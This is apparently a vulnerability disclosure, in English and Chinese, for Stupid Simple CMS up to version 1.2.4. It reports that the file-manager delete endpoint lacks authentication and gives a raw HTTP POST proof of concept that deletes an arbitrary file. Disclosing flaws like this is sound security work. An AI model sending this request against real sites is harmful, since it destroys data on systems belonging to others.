product： Stupid Simple CMS ( Blogger )

download link： https://github.com/codelyfe/Stupid-Simple-CMS

version：<=1.2.4

POC:
```shell
POST http://localhost/file-manager/delete.php HTTP/1.1
Host: localhost
Content-Length: 58
sec-ch-ua: "Chromium";v="91", " Not;A Brand";v="99"
Accept: */*
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.101 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/file-manager/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close

file=shelj.jpg
```
The code audit found that there is no authentication measure for the file deletion interface, which can cause arbitrary file deletion.
代码审计发现文件删除接口无鉴权措施，可导致任意文件删除。
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312171625799.png)
文件如图:
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312141255197.png)
![](https://cdn.jsdelivr.net/gh/g1an123/blogimage@main/202312141256578.png)
